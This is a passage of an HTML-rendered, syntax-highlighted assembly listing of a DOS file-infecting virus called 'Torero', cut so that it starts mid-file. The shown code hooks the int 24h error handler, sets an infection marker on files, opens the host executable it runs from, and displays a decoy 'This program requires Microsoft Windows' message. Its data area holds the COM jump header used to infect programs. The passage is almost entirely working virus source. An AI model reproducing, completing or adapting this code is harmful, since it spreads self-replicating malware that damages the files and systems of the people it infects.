                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">sector</span><span class="sc0">                  </span><span class="sc1">; Calculate its offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; into the sector and</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                     </span><span class="sc1">; move to si+0ch (header)</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Set int 24h УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">set_int_24h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Point to the IVT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; CS=ES</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Save the original int</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_24h</span><span class="sc0">      </span><span class="sc1">; 24h address and set</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                                </span><span class="sc1">; ours l8r</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Restore int 24h УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">reset_int_24h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Point to the IVT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; CS=DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_24h</span><span class="sc0">      </span><span class="sc1">; Restore the original</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; int 24h address</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Torero's int 24h handler УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">new_int_24h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; Pass the error code</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">old_int_24h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; Original int 24h</span><span class="sc0">

</span><span class="sc1">; ФФД Set our infection mark УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">set_marker</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Attribute bit 8</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Lseek to the start of the file УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">lseek_start</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Read pointer=0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Lseek to the end of the file УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">lseek_end</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Read pointer=file</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; length (EOF)</span><span class="sc0">

</span><span class="sc1">; ФФД Open the host we're being executed from УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">open_host</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                     </span><span class="sc1">; Get PSP address</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DS:2ch=PSP segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; Look for 01h (the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                  </span><span class="sc1">; mark which sepparates</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                      </span><span class="sc1">; the path from the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">emergency</span><span class="sc0">                  </span><span class="sc1">; name of the file that</span><span class="sc0">
                                                   </span><span class="sc1">; is being executed)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                     </span><span class="sc1">; Open the host</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Pass handle to BX</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; and return</span><span class="sc0">

</span><span class="sc1">; ФФД Emergency routine... data lost! УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">emergency</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; CS=DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                       </span><span class="sc1">; Show the message...</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">windows</span><span class="sc0">                 </span><span class="sc1">; This programs requires</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; Microsoft Windows</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c01h</span><span class="sc0">                   </span><span class="sc1">; Errorlevel=01 :)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; ФФД Data area УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">sector</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; The long sector</span><span class="sc0">

</span><span class="sc5">control_block</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          </span><span class="sc1">; Control block</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">garbage</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">';)'</span><span class="sc0">

</span><span class="sc5">windows</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'This program requires Microsoft Windows.'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">action</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                          </span><span class="sc1">; Reading or writing?</span><span class="sc0">
</span><span class="sc5">infecting</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">com_header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; The COM header</span><span class="sc0">
</span><span class="sc5">header_store</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">; Temporal header store</span><span class="sc0">

</span><span class="sc5">torero_end</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">torero</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">torero_start</span><span class="sc0">
</span></div></body>
</html>
